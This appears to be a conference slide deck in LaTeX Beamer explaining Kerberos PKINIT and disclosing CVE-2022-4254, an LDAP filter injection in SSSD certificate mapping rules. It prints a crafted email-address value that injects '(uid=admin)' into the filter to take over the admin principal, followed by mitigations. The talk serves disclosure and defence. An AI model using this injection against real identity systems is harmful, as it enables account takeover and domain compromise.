@@ -1,0 +1,549 @@
+\PassOptionsToPackage{unicode=true}{hyperref} % options for packages loaded elsewhere
+\PassOptionsToPackage{hyphens}{url}
+%
+\documentclass[ignorenonframetext,aspectratio=169,12pt]{beamer}
+\usepackage{pgfpages}
+\setbeamertemplate{caption}[numbered]
+\setbeamertemplate{caption label separator}{: }
+\setbeamercolor{caption name}{fg=normal text.fg}
+\beamertemplatenavigationsymbolsempty
+\usepackage{lmodern}
+\usepackage{amssymb,amsmath}
+\usepackage{ifxetex,ifluatex}
+\usepackage{fixltx2e} % provides \textsubscript
+\ifnum 0\ifxetex 1\fi\ifluatex 1\fi=0 % if pdftex
+  \usepackage[T1]{fontenc}
+  \usepackage[utf8]{inputenc}
+  \usepackage{textcomp} % provides euro and other symbols
+\else % if luatex or xelatex
+  \usepackage{unicode-math}
+  \defaultfontfeatures{Ligatures=TeX,Scale=MatchLowercase}
+\fi
+% use upquote if available, for straight quotes in verbatim environments
+\IfFileExists{upquote.sty}{\usepackage{upquote}}{}
+% use microtype if available
+\IfFileExists{microtype.sty}{%
+\usepackage[]{microtype}
+\UseMicrotypeSet[protrusion]{basicmath} % disable protrusion for tt fonts
+}{}
+\IfFileExists{parskip.sty}{%
+\usepackage{parskip}
+}{% else
+\setlength{\parindent}{0pt}
+\setlength{\parskip}{6pt plus 2pt minus 1pt}
+}
+\usepackage{hyperref}
+\hypersetup{
+            pdfborder={0 0 0},
+            breaklinks=true}
+\urlstyle{same}  % don't use monospace font for urls
+\newif\ifbibliography
+% Prevent slide breaks in the middle of a paragraph:
+\widowpenalties 1 10000
+\raggedbottom
+\setbeamertemplate{part page}{
+\centering
+\begin{beamercolorbox}[sep=16pt,center]{part title}
+  \usebeamerfont{part title}\insertpart\par
+\end{beamercolorbox}
+}
+\setbeamertemplate{section page}{
+\centering
+\begin{beamercolorbox}[sep=12pt,center]{part title}
+  \usebeamerfont{section title}\insertsection\par
+\end{beamercolorbox}
+}
+\setbeamertemplate{subsection page}{
+\centering
+\begin{beamercolorbox}[sep=8pt,center]{part title}
+  \usebeamerfont{subsection title}\insertsubsection\par
+\end{beamercolorbox}
+}
+\AtBeginPart{
+  \frame{\partpage}
+}
+\AtBeginSection{
+  \ifbibliography
+  \else
+    \frame{\sectionpage}
+  \fi
+}
+\AtBeginSubsection{
+  \frame{\subsectionpage}
+}
+\setlength{\emergencystretch}{3em}  % prevent overfull lines
+\providecommand{\tightlist}{%
+  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
+\setcounter{secnumdepth}{0}
+
+% set default figure placement to htbp
+\makeatletter
+\def\fps@figure{htbp}
+\makeatother
+
+\input{../share/unicode-decl.tex}
+
+\hypersetup{colorlinks,linkcolor=,urlcolor=purple}
+\setbeamertemplate{navigation symbols}{}
+\usefonttheme[onlymath]{serif}
+
+\setbeamercolor{footnote mark}{fg=gray}
+\setbeamerfont{footnote}{size=\tiny}
+\usepackage{color}
+\usepackage[normalem]{ulem}
+\usepackage{listings}
+\lstset{
+    basicstyle=\ttfamily\normalsize,
+    keywordstyle=\color{blue}\bfseries,
+    commentstyle=\color[rgb]{0,0.5,0}\bfseries\em,
+    stringstyle=\color{red}\bfseries\em,
+    escapeinside={(*}{*)}
+}
+
+\title{\bf Kerberos PKINIT}
+\providecommand{\subtitle}[1]{}
+\subtitle{\bf what, why and how (to break it)}
+\author{{\bf Fraser Tweedale}\\
+    \texttt{@hackuador@functional.cafe}\\
+    \bigskip
+    \def\svgwidth{4cm}
+    \input{Logo-RedHat-A-Color-RGB-ARTIFACT.pdf_tex}}
+\date{February 4, 2023}
+
+\begin{document}
+\frame{\titlepage}
+
+\begin{frame}{Agenda}
+\protect\hypertarget{agenda}{}
+
+\begin{itemize}
+    \item Kerberos overview
+    \item Kerberos PKINIT: overview and demo
+    \item PKINIT security considerations
+    \item Attack demo: CVE-2022-4254
+\end{itemize}
+
+\end{frame}
+
+
+\begin{frame}{Kerberos - overview}
+\protect\hypertarget{kerberos-overview}{}
+\begin{itemize}
+    \item Authentication protocol based on symmetric cryptography
+    \item {\em Single sign-on}: authenticate once, access many services
+    \item Started at MIT (1988), v5 (1993),
+        RFC 4120\footnote{\url{https://www.rfc-editor.org/rfc/rfc4120}} (2005)
+    \item Major implementations:
+        MIT Kerberos\footnote{\url{https://web.mit.edu/kerberos/}},
+        Microsoft Active Directory,
+        Heimdal\footnote{\url{https://github.com/heimdal/heimdal}},
+        FreeIPA\footnote{\url{https://www.freeipa.org}} / Identity Management in RHEL
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Kerberos - protocol}
+\protect\hypertarget{kerberos-protocol}{}
+\begin{itemize}
+    \item Parties: client, {\em Key Distribution Centre (KDC)}, service
+        \begin{itemize}
+            \item KDC = {\em Authentication Service (AS)} +
+                {\em Ticket Granting Service (TGS)}
+        \end{itemize}
+    \item Users, services, KDC are represented as \textbf{\em principals} in a \textbf{\em realm}
+    \item Each principle has a long-term \textbf{\em secret key}, shared with the KDC
+        \begin{itemize}
+            \item users derive it from a password
+            \item hosts/services store it in a file ("keytab")
+        \end{itemize}
+    \item Authentication tokens are called \textbf{\em tickets}
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-parties-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-as-req-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-as-rep-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-as-exchange-post-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-tgs-req-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-tgs-rep-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-tgs-rep-post-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-ap-req-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-ap-req-post-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{Kerberos - extensions and integrations}
+\protect\hypertarget{kerberos-integrations}{}
+
+\begin{itemize}
+    \item Pre-authentication framework\footnote{RFC 6113 - \url{https://www.rfc-editor.org/rfc/rfc6113}}
+        \begin{itemize}
+            \item integrate additional authentication mechanisms
+                e.g. {\bf OTP}\footnote{\url{https://web.mit.edu/kerberos/krb5-devel/doc/admin/otp.html}}
+        \end{itemize}
+    \item {\bf GSSAPI} mechanism\footnote{RFC 4121 - \url{https://www.rfc-editor.org/rfc/rfc4121}}
+    \item {\bf SASL} mechanism\footnote{RFC 4752 - \url{https://www.rfc-editor.org/rfc/rfc4752}}
+    \item {\bf HTTP} authentication (SPNEGO)\footnote{RFC 4178 - \url{https://www.rfc-editor.org/rfc/rfc4178}}
+    \item {\bf Authentication Indicator}\footnote{RFC 8129 - \url{https://www.rfc-editor.org/rfc/rfc8129}}
+    \item Cross-realm authentication (trusts)
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}{Kerberos - advantages}
+\protect\hypertarget{kerberos-advantages}{}
+
+\begin{itemize}
+    \item {\bf Single sign-on}: improve efficiency, reduce password fatigue
+    \item Client exposes long-term secret only once (until TGT expires)
+    \item Resistant to replay attacks
+    \item Works well for HTTP and "bare" network protocols
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}{Kerberos - problems}
+\protect\hypertarget{kerberos-problems}{}
+
+\begin{itemize}
+    \item Passwords are not great
+    \item Password / keytab rotation is burdensome
+\end{itemize}
+
+\end{frame}
+
+
+\begin{frame}{PKINIT - overview}
+\protect\hypertarget{pkinit-overview}{}
+\begin{itemize}
+    \item \textbf{\em Public Key Cryptography for Initial Authentication in
+        Kerberos}\footnote{RFC 4556 - \url{https://www.rfc-editor.org/rfc/rfc4556}}
+    \item Client uses {\em asymmetric cryptography} to authenticate to KDC
+    \item Client presents
+        {\bf X.509}\footnote{RFC 5280 - \url{https://www.rfc-editor.org/rfc/rfc5280}}
+        certificate and signs message
+    \item KDC verifies certificate, signature and client binding
+    \item KDC encrypts response using either:
+        \begin{itemize}
+            \item Diffie-Hellman (DH) or analogous key agreement algorithm
+            \item other public-key encryption algorithm
+        \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}{PKINIT - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-pkinit-as-req-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{PKINIT - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-pkinit-as-rep-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{PKINIT - protocol}
+\begin{center}
+\def\svgwidth{\textwidth}
+\input{kerb-pkinit-as-exchange-post-ARTIFACT.pdf_tex}
+\end{center}
+\end{frame}
+
+\begin{frame}{PKINIT in FreeIPA}
+\protect\hypertarget{pkinit-in-freeipa}{}
+\begin{itemize}
+    \item Default: {\bf exact certificate match} only
+    \item Optional: \textbf{\em certificate mapping rules}
+        \begin{itemize}
+            \item {\tt ipa certmaprule-add certmap \textbackslash{} \\
+                ~~~~{-}{-}maprule "(fqdn=\{subject\_dns\_name\})"}
+        \end{itemize}
+    \item Client certs can be signed by internal or third-party CA
+\end{itemize}
+\end{frame}
+
+\begin{frame}{PKINIT - user experience}
+\protect\hypertarget{pkinit-ux}{}
+\begin{itemize}
+    \item CLI: {\tt kinit -X X509\_user\_identity=FILE:cert.pem,key.pem}
+    \item SSSD can integrate with Linux login managers
+        \begin{itemize}
+            \item Nice UX for smartcards and 2FA
+            \item Windows offers a similiar experience
+        \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[plain]
+\centering
+\huge Demo
+\end{frame}
+
+
+\begin{frame}{PKINIT - advantages}
+\protect\hypertarget{pkinit-advantages}{}
+\begin{itemize}
+    \item No more passwords / client shared secret
+    \item Key can reside on smart-card (e.g. Yubikey) / TPM / HSM
+    \item The rest of the protocol is unchanged
+\end{itemize}
+\end{frame}
+
+\begin{frame}{PKINIT - complexities}
+\protect\hypertarget{pkinit-complexities}{}
+\begin{itemize}
+    \item X.509 PKI required
+    \item Renewal considerations
+    \item Revocation checking is hard (or time consuming)
+    \item Hardware (e.g. smart cards) → additional cost
+    \item Binding the public key to the principal - how?
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{PKINIT - key binding}
+\protect\hypertarget{pkinit-key-binding-1}{}
+\small
+\begin{verbatim}
+In addition to validating the client's signature, the KDC MUST also
+check that the client's public key used to verify the client's
+signature is bound to the client principal name specified in the AS-
+REQ as follows:
+
+1. If the KDC has its own binding between either the client's
+   signature-verification public key or the client's certificate and
+   the client's Kerberos principal name, it uses that binding.
+
+2. Otherwise, if the client's X.509 certificate contains a Subject
+   Alternative Name (SAN) extension carrying a KRB5PrincipalName
+   (defined below) in the otherName field of the type GeneralName
+   [RFC3280], it binds the client's X.509 certificate to that name.
+\end{verbatim}
+\end{frame}
+
+\begin{frame}{PKINIT - key binding}
+\protect\hypertarget{pkinit-key-binding-2}{}
+\begin{itemize}
+    \item Encode principal name in certificate ({\tt KRB5PrincipalName} SAN)
+    \item Associate certificate/key with principal in database
+        \begin{itemize}
+            \item {\bf administrative overhead} due to renewal/rekey 
+        \end{itemize}
+    \item Other heuristics; for example:
+        \begin{itemize}
+            \item if certificate has {\tt dNSName} SAN,
+                look for that host principal
+            \item if certificate has {\tt rfc822Name} (email address) SAN,
+                look for the corresonding user principal
+        \end{itemize}
+    \item {\bf Better not mess this up!}
+\end{itemize}
+\end{frame}
+
+
+
+\begin{frame}[plain]
+\centering
+\huge CVE-2022-4254
+\end{frame}
+
+
+\begin{frame}{CVE-2022-4254 - what happened?}
+\protect\hypertarget{vuln-desc}{}
+
+\begin{itemize}
+\item LDAP filter injection\footnote{CWE-90 - \url{https://cwe.mitre.org/data/definitions/90.html}}
+\item FreeIPA {\bf not vulnerable in default configuration}
+    \begin{itemize}
+        \item only exact certificate match is enabled by default
+    \end{itemize}
+\item Bug introduced in SSSD v1.15.3 and resolved in v2.3.1
+    \begin{itemize}
+        \item Will also be fixed in of v1.16.6, if/when released
+    \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]{CVE-2022-4254 - LDAP filter}
+\protect\hypertarget{vuln-filter-wildcard}{}
+\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
+(&
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=(*\colorbox{yellow}{host/rhel78-0.ipa.test@IPA.TEST}*))
+    (krbPrincipalName:caseIgnoreIA5Match:=host/rhel78-0.ipa.test@IPA.TEST)
+  )
+  ((*\colorbox{yellow}{fqdn=*.ipa.test}*))
+)
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}[plain]
+\centering
+\Large What if your email address is \\
+    ~\\
+    \large
+    \texttt{"bogus)(uid=admin)(cn="@ipa.test}
+\end{frame}
+
+\begin{frame}[plain]
+\centering
+\Large \ldots{}and your certmap rule looks like \\
+    ~\\
+    \large
+    \texttt{(|(mail=\{subject\_rfc822\_name\})(entryDN=\{subject\_dn\})}
+\end{frame}
+
+\begin{frame}[fragile]{CVE-2022-4254 - domain takeover}
+\protect\hypertarget{vuln-filter-mail}{}
+\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
+(&
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=(*\colorbox{yellow}{admin@IPA.TEST}*))
+    (krbPrincipalName:caseIgnoreIA5Match:=admin@IPA.TEST)
+  )
+  (*\colorbox{yellow}{(|}*)
+    (mail="bogus)
+    ((*\colorbox{yellow}{uid=admin}*))
+    (cn="@ipa.test)
+    (entrydn=CN=alice,O=IPA.TEST 202211171708)
+  )
+\end{lstlisting}
+\end{frame}
+
+\begin{frame}{CVE-2022-4254 - mitigations}
+\protect\hypertarget{vuln-mitigations}{}
+
+\begin{itemize}
+\item Upgrade to fixed/patched releases of SSSD
+\item {\tt and-list} rules are harder to exploit than {\tt or-list}
+\item Audit what data get included in certs, and how
+\item Use exact certificate matching
+\end{itemize}
+\end{frame}
+
+\begin{frame}{PKINIT - security considerations}
+\protect\hypertarget{pkinit-security-considerations}{}
+
+\begin{itemize}
+\item Properly escape/sanitise all inputs, always.
+\item Review CA trust, profiles, and validation behaviour
+    \begin{itemize}
+    \item Which CAs do you trust?  Who can issue certificates?
+    \item How do you validate the data that go into a certificate?
+    \item Can attributes be influenced by users or other parties?
+    \end{itemize}
+\item Just because a value is {\em valid} does not mean it's {\em benign}
+\item Key/principal binding is a {\bf critical} aspect of PKINIT security
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}{Links}
+\protect\hypertarget{links}{}
+
+\begin{itemize}
+\item Writeup: \url{https://is.gd/CVE_2022_4254}
+\item Red Hat CVE database: \url{https://access.redhat.com/security/cve/CVE-2022-4254}
+\end{itemize}
+
+\end{frame}
+
+
+\begin{frame}[plain]
+\begin{columns}
+
+  \begin{column}{.6\textwidth}
+
+    \setlength{\parskip}{.5em}
+
+    { \centering
+
+    \input{cc-by-ARTIFACT.pdf_tex}
+
+    \copyright~2023  Red Hat, Inc.
+
+    { \scriptsize
+    Except where otherwise noted this work is licensed under
+    }
+    { \footnotesize
+    \textbf{http://creativecommons.org/licenses/by/4.0/}
+    }
+
+    }
+
+    \begin{description}
+      \item[Slides] \href{https://speakerdeck.com/frasertweedale}{speakerdeck.com/frasertweedale}
+      \item[Blog] \href{https://frasertweedale.github.io/blog-redhat/}{frasertweedale.github.io/blog-redhat}
+      \item[Email] \texttt{ftweedal@redhat.com}
+      \item[Fediverse] \href{https://functional.cafe/@hackuador}{@hackuador@functional.cafe}
+    \end{description}
+  \end{column}
+
+\end{columns}
+\end{frame}
+
+\end{document}
